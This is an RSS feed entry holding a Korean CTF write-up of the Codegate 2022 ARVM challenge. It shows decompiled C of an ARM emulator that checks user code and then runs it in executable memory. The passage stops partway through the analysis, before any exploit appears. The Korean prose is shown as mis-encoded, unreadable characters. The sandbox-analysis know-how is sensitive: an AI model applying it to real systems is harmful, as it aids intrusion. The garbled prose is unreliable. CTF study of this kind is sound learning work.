<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JUHYUN167</title>
    <link>https://juhyun167.github.io/</link>
    
    <atom:link href="https://juhyun167.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Sun, 03 Jul 2022 14:59:25 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Codegate CTF 2022] ARVM</title>
      <link>https://juhyun167.github.io/2022/07/03/codegate22-arvm/</link>
      <guid>https://juhyun167.github.io/2022/07/03/codegate22-arvm/</guid>
      <pubDate>Sun, 03 Jul 2022 11:26:07 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome! Here is my Emulator. It can use only human.&lt;br&gt;
Always SMiLEY ğŸ˜ƒ&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><blockquote><p>Welcome! Here is my Emulator. It can use only human.<br>Always SMiLEY ğŸ˜ƒ</p></blockquote><p><a href="/uploads/codegate22-arvm/chall.zip">chall.zip</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><p>32ë¹„íŠ¸ ARM ë°”ì´ë„ˆë¦¬ <code>app</code> ê³¼ <code>Dockerfile</code> , <code>run.sh</code> ë“±ì´ ì£¼ì–´ì§‘ë‹ˆë‹¤. <code>run.sh</code> íŒŒì¼ì—ì„œ ë°”ì´ë„ˆë¦¬ëŠ” <code>qemu-arm-static</code> ìœ¼ë¡œ ì—ë®¬ë ˆì´ì…˜í•˜ì—¬ ì‹¤í–‰ë¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ëŠ” ì‹¬ë³¼ì´ stripë˜ì–´ ìˆê³ , NX, canary ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ì½”ë“œë¥¼ ì…ë ¥ë°›ê³ , 3ê°€ì§€ì˜ ë©”ë‰´ê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤. ì½”ë“œë¥¼ ì…ë ¥í•˜ê³  '1. Run Codeâ€™ë¥¼ ì„ íƒí•˜ë©´ ë°”ì´ë„ˆë¦¬ê°€ ì¶œë ¥í•˜ëŠ” Secret codeë¥¼ ë˜‘ê°™ì´ ì…ë ¥í•´ì•¼ í•˜ëŠ”ë°, ì•ì„œ ì½”ë“œë¡œ â€œ111â€ ì„ ì…ë ¥í–ˆë”ë‹ˆ â€œInstruction 0xa31313131 is invalidâ€ ë©”ì‹œì§€ì™€ í•¨ê»˜ ì¢…ë£Œë©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app</span><br><span class="line">Running Emulator...</span><br><span class="line">Welcome Emulator</span><br><span class="line">Insert Your Code :&gt; 111</span><br><span class="line">1. Run Code</span><br><span class="line">2. View Code</span><br><span class="line">3. Edit Code</span><br><span class="line">:&gt; 1</span><br><span class="line">Before run, it has some captcha</span><br><span class="line">Secret code : 0x52bae0cd</span><br><span class="line">Code? :&gt; 0x52bae0cd</span><br><span class="line">Instruction 0xa313131 is invalid</span><br></pre></td></tr></table></figure><p><code>main</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 13í–‰ì—ì„œ <code>setup</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ í•„ìš”í•œ êµ¬ì¡°ì²´ì™€ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³ , 17í–‰ì—ì„œ <code>edit_code</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì½”ë“œë¥¼ ì…ë ¥ë°›ìŠµë‹ˆë‹¤. 53í–‰ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>check_code</code> í•¨ìˆ˜ì˜ ë¦¬í„´ê°’ì´ -1ì´ ì•„ë‹ˆë©´ 56~61í–‰ì—ì„œ ì…ë ¥í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ”ë°, <code>R0</code> ë¶€í„° <code>R12</code> ê¹Œì§€ ëª¨ë‘ 0ìœ¼ë¡œ ì´ˆê¸°í™”í•˜ëŠ” ì½”ë“œë¥¼ ì•ì— ë§ë¶™ì¸ í›„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> captcha; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [sp+8h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [sp+Ch] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+1Ch] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;_stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( setup() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">16u</span>);</span><br><span class="line">    choice = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )                          <span class="comment">// 1. Run Code</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )                          <span class="comment">// 2. View Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )                     <span class="comment">// 3. Edit Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  captcha = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  read(fd, &amp;captcha, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before run, it has some captcha&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Secret code : 0x%x\n&quot;</span>, captcha);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Code? :&gt; &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;0x%x&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( captcha != input )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are Robot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( check_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good! Now Execute Real Machine&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(em-&gt;code, <span class="number">0</span>, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(em-&gt;code, &amp;clear_regs_code, <span class="number">52u</span>);      <span class="comment">// mov &#123;r0-r12&#125;, 0</span></span><br><span class="line">  v0 = <span class="built_in">memcpy</span>(em-&gt;code + <span class="number">52</span>, dest, <span class="number">4044u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))em-&gt;code)(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setup</code> í•¨ìˆ˜ëŠ” <code>emulator</code> êµ¬ì¡°ì²´ ë³€ìˆ˜ <code>em</code> ê³¼ <code>reg</code> êµ¬ì¡°ì²´, ê°ì¢… ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. <code>emulator</code> êµ¬ì¡°ì²´ëŠ” <code>mmap</code> ì‹œìŠ¤í…œ ì½œë¡œ í• ë‹¹í•œ ì½”ë“œ, í™, ìŠ¤íƒ ì—­í• ì„ í•˜ëŠ” ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œì™€ <code>reg</code> êµ¬ì¡°ì²´ í¬ì¸í„°ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. <code>reg</code> êµ¬ì¡°ì²´ëŠ” ë²”ìš© ë ˆì§€ìŠ¤í„°ë“¤ê³¼ <code>CPSR</code> ë ˆì§€ìŠ¤í„° ì—­í• ì„ í•˜ëŠ” ì •ìˆ˜í˜• ë³€ìˆ˜ 17ê°œë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. í• ë‹¹ ì´í›„ <code>em-&gt;reg-&gt;pc</code> , <code>em-&gt;reg-&gt;sp</code> ë¥¼ ê°ê° <code>em-&gt;code</code> , <code>em-&gt;stack</code> ìœ¼ë¡œ ì´ˆê¸°í™”í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup</span><span class="params">()</span> <span class="comment">// 0x1088c</span></span><br><span class="line">&#123;</span><br><span class="line">  emulator *v1; <span class="comment">// r4</span></span><br><span class="line">  emulator *v2; <span class="comment">// r4</span></span><br><span class="line">  emulator *v3; <span class="comment">// r4</span></span><br><span class="line">  emulator *v4; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  em = (emulator *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">16u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = em;</span><br><span class="line">  v1-&gt;code = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">4096u</span>, <span class="number">7</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;code )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = em;</span><br><span class="line">  v2-&gt;heap = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x2000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;heap )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = em;</span><br><span class="line">  v3-&gt;<span class="built_in">stack</span> = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x3000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;<span class="built_in">stack</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = em;</span><br><span class="line">  v4-&gt;reg = (<span class="keyword">struct</span> reg *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">68u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;reg )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;code;</span><br><span class="line">  em-&gt;reg-&gt;sp = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">emulator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">reg</span> *<span class="title">reg</span>;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">char</span> *heap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sp, lr, pc, cpsr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>edit_code</code> í•¨ìˆ˜ëŠ” <code>em-&gt;code</code> ì£¼ì†Œì— ì‹¤í–‰í•  ì½”ë“œë¥¼ ì…ë ¥ë°›ëŠ”ë°, ê¸¸ì´ê°€ 4ì˜ ë°°ìˆ˜ê°€ ì•„ë‹ˆë©´ -1ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ ê²½ìš° <code>main</code> í•¨ìˆ˜ì—ì„œ <code>exit(-1)</code> ì„ í˜¸ì¶œí•˜ì—¬ ì¢…ë£Œí•©ë‹ˆë‹¤. ì…ë ¥ë°›ì€ í›„ <code>exit</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ëŠ” ì½”ë“œë¥¼ ë’¤ì— ë§ë¶™ì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_code</span><span class="params">()</span> <span class="comment">// 0x10af0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> len; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = read(<span class="number">0</span>, em-&gt;code, <span class="number">4031u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (len &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;em-&gt;code[len], &amp;exit_code, <span class="number">12u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_code</code> í•¨ìˆ˜ëŠ” ë°˜ë³µë¬¸ì„ ëŒë©´ì„œ <code>em-&gt;reg-&gt;pc</code> ë¡œë¶€í„° 4ë°”ì´íŠ¸ì”© ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>inst</code> ë¥¼ ì½ìŠµë‹ˆë‹¤. <code>check_cpsr</code> í•¨ìˆ˜ë¥¼ <code>inst</code> ë¥¼ ì¸ìë¡œ í˜¸ì¶œí•˜ì—¬ ë¦¬í„´ê°’ì´ 0ì´ ì•„ë‹ˆë©´, switch-case êµ¬ë¬¸ìœ¼ë¡œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ í´ë˜ìŠ¤ì— í•´ë‹¹í•˜ëŠ” <code>check_*</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. <code>check_cpsr</code> í•¨ìˆ˜ê°€ 0ì„ ë¦¬í„´í•˜ê±°ë‚˜ <code>check_*</code> í•¨ìˆ˜ê°€ -1ì„ ë¦¬í„´í•˜ëŠ” ê²½ìš° <code>sigill</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ë°, ì´ í•¨ìˆ˜ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³  <code>exit(-1)</code> ë¡œ í”„ë¡œê·¸ë¨ì„ ì¢…ë£Œí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span> <span class="comment">// 0x10bb0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> op1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> inst; <span class="comment">// [sp+0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> fetched; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="keyword">if</span> ( op1 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( op1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:                                <span class="comment">// data processing and miscellaneous instructions</span></span><br><span class="line">          <span class="keyword">if</span> ( check_data_processing(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( check_multiply(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:                                <span class="comment">// branch, branch with link, block data transfer</span></span><br><span class="line">          <span class="keyword">if</span> ( check_branch(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          fetched = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:                                <span class="comment">// supervisor call</span></span><br><span class="line">          <span class="keyword">if</span> ( check_syscall() == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:                                <span class="comment">// load/store word and unsigned byte</span></span><br><span class="line">          <span class="keyword">if</span> ( check_load_store(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°ê°ì˜ <code>check_*</code> í•¨ìˆ˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ í˜•ì‹ì´ë‚˜ ì¸ìë¥¼ ê²€ì‚¬í•œ í›„, í†µê³¼í•˜ë©´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì‹¤í–‰ ê²°ê³¼ë¥¼ <code>emulator</code> êµ¬ì¡°ì²´ ë³€ìˆ˜ <code>em</code> ì— ë°˜ì˜í•˜ê³  í†µê³¼í•˜ì§€ ëª»í•œ ê²½ìš° -1ì„ ë¦¬í„´í•˜ì—¬ ì¢…ë£Œí•˜ë„ë¡ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>check_branch</code> í•¨ìˆ˜ëŠ” ì¸ìê°€ ìƒìˆ˜(immediate) ê°’ì¸ ë¶„ê¸° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ê²€ì‚¬í•˜ê³  <code>em-&gt;reg-&gt;pc</code> ë¥¼ ê°±ì‹ í•˜ëŠ”ë°, ì¡°ê±´ë¬¸ì„ í†µí•´ ëª©ì ì§€ ì£¼ì†Œê°€ <code>em-&gt;code</code> ë¡œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ë¥¼ ë²—ì–´ë‚˜ëŠ” ê²½ìš° -1ì„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_branch</span><span class="params">(<span class="type">int</span> inst)</span>   <span class="comment">// 0x11f28</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = shl8(inst);</span><br><span class="line">  v2 = <span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((v1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x20000000</span>) != <span class="number">0</span> )</span><br><span class="line">    v2 += <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( em-&gt;reg-&gt;pc + <span class="number">4</span> * (v2 &gt;&gt; <span class="number">2</span>) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">0x4000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  